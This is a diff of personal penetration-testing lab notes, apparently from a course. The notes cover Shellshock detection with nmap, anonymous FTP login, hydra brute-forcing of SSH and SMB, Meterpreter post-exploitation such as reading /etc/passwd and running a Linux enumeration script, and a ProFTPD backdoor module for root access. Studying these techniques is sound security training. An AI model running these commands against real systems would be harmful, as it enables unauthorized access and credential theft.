@@ -38,8 +38,8 @@ Shellshock Exploration:
 - perform service detection scan on target to confirm apache running 
 - visit the ip in browser 
 	- identify CGI script on webpage (look at page source) ![[Pasted image 20230710132143.png]]
-	 the cgi script is passing commands in bash you can use this as input vector but before that you need to check if this system is vulnerable to shellshock explotation -> check in nmap 
-- Check if system is vulnerable to shellshock: `nmap -sV ip --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" `
+	 the cgi script is passing commands in bash you can use this as input vector but before that you need to check if this system is vulnerable to shellshock exploration -> check in nmap 
+- `nmap -sV ip --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" `
 	- `--script=http-shellshock`: This option specifies that you want to use the `http-shellshock` script. Shellshock is a vulnerability in the Bash shell that allows remote code execution. The script is designed to detect if the target web server is vulnerable to this specific vulnerability.
 	- `--script-args "http-shellshock.uri=/gettime.cgi"`: This argument provides additional parameters to the `http-shellshock` script. In this case, it sets the URI (Uniform Resource Identifier) to `/gettime.cgi`, which is the path of a specific CGI script on the target server. This allows the script to test the vulnerability specifically on that CGI script.
 	- go to the browser and visit targetip/cgi link - configure Mozilla with foxyproxy - select Burp so all the traffic is redirected to Burp ![[Pasted image 20230710133011.png]]
@@ -79,9 +79,7 @@ How do we exploit this vulnerability in metasploit?
 	- anonymous access: login without credentials 
 
 
---- demo - --
-
-- perform nmap `service scan` 
+-  `service scan` 
 - check if anonymous access is configured: 
 	- `ftp ip `
 	- `name: anonymous password: anonymous`
@@ -110,7 +108,6 @@ How do we exploit this vulnerability in metasploit?
 - In the case of username and password authentication, a brute-force attack can be attempted on the SSH server to discover valid credentials and gain access to the target system.
 
 
--- demo -- 
 - perform `nmap service scan `
 - perform bruteforce attack: 
 	- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt targetip -t 4 ssh `
@@ -141,7 +138,7 @@ Exploiting SAMBA:
 
 Demo enumerating shares 
 - `nmap service scan` 
-- perform `bruteforce` on `smb` 
+-  bruteforce on smb
 - `hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt targetip smb `
 	- we don't use a wordlist or username because we know which account/username we want to bruteforce 
 - `smbmap` 
@@ -175,24 +172,22 @@ Tools & Environment:
 - be carefull with kernel exploits because it can cause kernel panic and dataloss 
 
 
--- Demo -- 
-
 Set up `meterpreter` session:
-	- sysinfo 
-	- getuid 
+	- `sysinfo` 
+	- `getuid` 
 	- obtain a bash session: 
-		- shell 
-		- cat /etc/passwd 
-		- sudo apt-get update 
+		- `shell` 
+		- `cat /etc/passwd `
+		- `sudo apt-get update `
 	- obtain root privileges 
 		- download LES on kali and then transferring it over to target 
 		- in meterpreter session cd /tmp and ls 
-		- upload ~/Desktop/Linux-Enum/les.sh 
-		- shell 
-		- /bin/bash -i 
-		- chmod +x les.sh 
-		- ls - alps 
-		- ./les.sh (this will execute the script)
+		- `upload ~/Desktop/Linux-Enum/les.sh `
+		- `shell` 
+		- /`bin/bash -i `
+		- `chmod +x les.sh` 
+		- `ls - alps` 
+		- `./les.sh` 
 verify exploit code to ensure that it is not doing anything malicious 
 
 ![[Pasted image 20230712152115.png]]
@@ -360,16 +355,15 @@ Linux Password Hashes:
 ![[Pasted image 20230706232136.png]]
 5 and 6 are harder to crack 
 
--- demo -- 
+
 -  `searchsploit` for ftp version 
-- start msfconsole and search exploit module (search proftpd)
+- start msfconsole and search exploit module 
 	- use backdoor module 
 	- `/bin/bash -i`  (to obtain bash session)
 	- id 
 	- cntrl + Z to put this session in the background 
-		- sessions 
-		**- sessions -u 1 (upgrade session 1 to meterpreter session)**
-		- sessions 
+		- `sessions` 
+		`- sessions -u 1 (upgrade session 1 to meterpreter session)`
 		- session 2 
 		- `sysinfo` 
 		- `getuid`  (uid=0 -> root user )
